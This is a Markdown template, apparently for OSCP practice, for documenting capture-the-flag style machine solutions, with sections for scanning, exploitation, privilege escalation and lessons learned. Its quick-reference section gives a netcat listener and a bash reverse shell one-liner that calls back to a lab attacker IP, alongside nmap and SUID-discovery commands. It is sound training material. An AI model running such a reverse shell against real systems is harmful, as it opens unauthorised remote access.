---
title: Machine Writeup Template
description: Complete template for documenting machine solutions
tags: [template, writeup, oscp]
---

# 📝 Machine Writeup Template

> Copy this template for each machine you solve. Fill it out as you work through the machine, not after.

---

## Machine Information

| Field | Value |
|-------|-------|
| **Name** | HTB / Lab Name |
| **Difficulty** | Easy / Medium / Hard / Insane |
| **OS** | Linux / Windows |
| **IP Address** | 10.10.10.XXX |
| **Date Started** | YYYY-MM-DD |
| **Date Solved** | YYYY-MM-DD |
| **Time Invested** | X hours |
| **User Flag** | Flag{...} (if applicable) |
| **Root Flag** | Flag{...} (if applicable) |

---

## Quick Summary

**One-sentence description of the machine and how it was pwned:**

> Example: "WordPress blog vulnerable to [[Exploitation/Web/SQL-Injection|SQL injection]] leading to admin access, then exploited [[Exploitation/Web/File-Upload-Vulnerabilities|file upload]] for shell and [[Exploitation/Linux/Privilege-Escalation#SUID-Abuse|SUID binary abuse]] for root."

---

## 🔍 Enumeration

### Network Reconnaissance

```bash
# Initial ping test
$ ping -c 1 10.10.10.XXX

# Port scan
$ nmap -sn 10.10.10.XXX
$ nmap -p- --min-rate=1000 10.10.10.XXX

# Service fingerprinting
$ nmap -sV -sC -p- 10.10.10.XXX -oN nmap.txt
```

**Open Ports Identified:**
- Port XXX (Protocol) — Service/Version

### Service Enumeration

#### Port XXX — [Service Name]

**Enumeration Commands:**

```bash
$ [tool] [target] [options]
$ [output]
```

**Findings:**
- Finding 1
- Finding 2

---

## 🎯 Vulnerability Analysis

### Vulnerability #1: [Name]

**Type:** [[Exploitation/Category/Technique|Technique Type]]

**Description:**
Brief description of the vulnerability and why it's exploitable.

**Evidence:**
```
Code/output showing the vulnerability
```

**Impact:** Confidentiality / Integrity / Availability / RCE

**Exploitability:** Easy / Medium / Hard

---

## ⚔️ Exploitation

### Attack Path Overview

```
Enumeration → Vulnerability #1 → [Access Level]
            → Vulnerability #2 → [Escalation]
            → Privilege Escalation → Root
```

### Step 1: Initial Access via [Vulnerability]

**Objective:** Gain shell access as [user]

**Commands Used:**

```bash
$ [command to exploit]
# [explanation of what this does]

$ [follow-up command]
# [proof of exploitation]
```

**Proof of Exploitation:**

```
[Screenshot or command output showing successful exploitation]
```

**Tools Used:**
- [[Tools-Reference/Tool-Name|Tool Name]]
- [[Tools-Reference/Tool-Name|Tool Name]]

---

### Step 2: [Next Exploitation Step]

**Objective:** [Goal]

**Methodology:**
1. First step
2. Second step
3. Third step

**Commands:**

```bash
$ [command]
$ [output]
```

**Proof:**

```
[Evidence of success]
```

---

## 🔧 Post-Exploitation

### Information Gathering on Compromised System

**Objective:** Identify privilege escalation vectors

**System Enumeration:**

```bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ sudo -l
# [sudo rights output]

$ find / -perm -4000 2>/dev/null
# [SUID binaries output]
```

**Key Findings:**
- Finding 1 (leads to privesc vector)

### Privilege Escalation

**Type:** [[Exploitation/Linux/Privilege-Escalation#SUID-Abuse|SUID Abuse]] / [[Exploitation/Linux/Privilege-Escalation#Sudo-Bypass|Sudo Bypass]] / etc.

**Vulnerability:**
Description of what allows privilege escalation.

**Exploitation:**

```bash
$ [privesc command]
$ whoami
root
```

**Proof of Root Access:**

```bash
$ id
uid=0(root) gid=0(root) groups=0(root)

$ cat /root/root.txt
FLAG{...}
```

---

## 📊 Timeline

| Time | Action | Result |
|------|--------|--------|
| T+0m | Started nmap | 3 ports open |
| T+10m | Web enumeration | Found SQL injection |
| T+25m | SQL injection exploit | Admin access |
| T+40m | File upload shell | Low-priv shell as www-data |
| T+60m | SUID binary exploitation | Root shell |
| T+65m | Flag capture | Machine solved |

---

## 🎓 Lessons Learned

### What Worked Well

✅ **Technique 1:** Why this was effective
✅ **Technique 2:** Why this saved time
✅ **Methodology:** What part of your process was strong

### What Didn't Work

❌ **Attempted technique:** Why it failed
❌ **Time wasted:** What you should have done differently

### Key Insights

💡 **Insight 1:** Connection between [technique A] and [technique B]
💡 **Insight 2:** Important detail you almost missed
💡 **Insight 3:** Pattern to watch for in future machines

### Techniques to Practice More

🔄 **[[Exploitation/Web/Server-Side-Template-Injection|SSTI]]** — Didn't encounter but should know better
🔄 **[[Exploitation/Linux/Container-Escape|Container Escape]]** — Saw references, need to study

### Related Machines to Solve

- **[Machine Name]** — Similar [[Exploitation/Web/SQL-Injection|SQL injection]] technique
- **[Machine Name]** — Similar [[Exploitation/Linux/Privilege-Escalation|privesc]] vector

---

## 📚 Resources Used

- **Tools:** [[Tools-Reference/Web-Fuzzing|ffuf]], [[Tools-Reference/Exploitation-Frameworks|Metasploit]]
- **Techniques:** [[Enumeration/Web-Enumeration|Web enumeration]], [[Exploitation/Web/SQL-Injection|SQL injection]]
- **References:** [IppSec video](https://youtube.com/...), [HackTricks page](https://hacktricks.xyz/...)

---

## 📝 Commands Reference

### Quick Copy-Paste Oneliners

```bash
# Reverse shell (attacker listener)
nc -lnvp 4444

# Reverse shell (from target)
bash -i >& /dev/tcp/10.10.14.XXX/4444 0>&1
```

---

## 🔐 Security Notes

- **Credentials Discovered:**
  - Username: [user]
  - Password: [pass] (used for: [service])

- **Sensitive Files Found:**
  - [File path] — [brief description]

> ⚠️ Remember: In writeups for public sharing, redact or replace real credentials and sensitive paths.

---

## Appendix: Full Command Log

Paste your full terminal session here or link to terminal.log

```bash
# Full session of all commands used
# [commands...]
```

---

**Template Version**: 1.0  
**For Use With**: OSCP Preparation  
**Last Updated**: 2026-10-07
